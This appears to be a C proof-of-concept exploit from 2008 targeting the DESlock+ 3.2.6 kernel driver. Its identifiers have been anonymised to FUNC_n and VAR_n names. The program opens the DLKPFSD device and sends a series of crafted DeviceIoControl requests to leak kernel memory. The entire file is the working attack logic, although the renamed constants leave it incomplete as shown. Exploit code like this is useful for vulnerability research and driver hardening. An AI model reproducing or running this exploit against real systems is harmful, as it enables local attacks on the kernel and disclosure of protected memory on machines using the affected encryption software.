
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct ioctl_req {int req_num; void** arg; int flag; } ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;
typedef int BOOL ;


 int FUNC_0 (scalar_t__) ;
 scalar_t__ FUNC_1 (char*,int ,int,int *,int ,int ,int *) ;
 int VAR_0 ;
 int VAR_1 ;
 int FUNC_2 (scalar_t__,int ,struct ioctl_req*,int,struct ioctl_req*,int,int*,int ) ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 scalar_t__ VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ,char*,...) ;
 int FUNC_5 (struct ioctl_req*,int ,int) ;
 int FUNC_6 (char*,...) ;
 int VAR_10 ;
 int FUNC_7 (struct ioctl_req*) ;

int
FUNC_8 (int VAR_11, char **VAR_12)
{
  struct ioctl_req VAR_13;
  DWORD VAR_14, VAR_15;
  HANDLE VAR_16;
  BOOL VAR_17;

  FUNC_6 ("DESlock+ <= 3.2.6 local kernel mem leak PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  VAR_16 = FUNC_1 ("\\\\.\\DLKPFSD_Device", VAR_4,
                       VAR_5|VAR_6, ((void*)0),
                       VAR_8, 0, ((void*)0));
  if (VAR_16 == VAR_7)
    {
      FUNC_4 (VAR_10, "* CreateFileA failed, %ld\n", VAR_16);
      FUNC_3 (VAR_2);
    }

  FUNC_5 (&VAR_13, 0, sizeof VAR_13);

  for (VAR_14 = 0; VAR_14 <= VAR_9; VAR_14++)
    {
      VAR_13.flag = VAR_0;
      VAR_13.req_num = 0x03;
      VAR_13.arg[0] = (void *) VAR_14;

      FUNC_7 (&VAR_13);
      VAR_17 = FUNC_2 (VAR_16, VAR_1,
                                &VAR_13, sizeof VAR_13, &VAR_13, sizeof VAR_13, &VAR_15, 0);
      if (!VAR_17)
        {
          FUNC_4 (VAR_10, "* DeviceIoControl failed\n");
          FUNC_3 (VAR_2);
        }

      if (!(VAR_14 % 64))
        FUNC_6 ("%d..", VAR_14);
    }

  FUNC_0 (VAR_16);

  return (VAR_3);
}
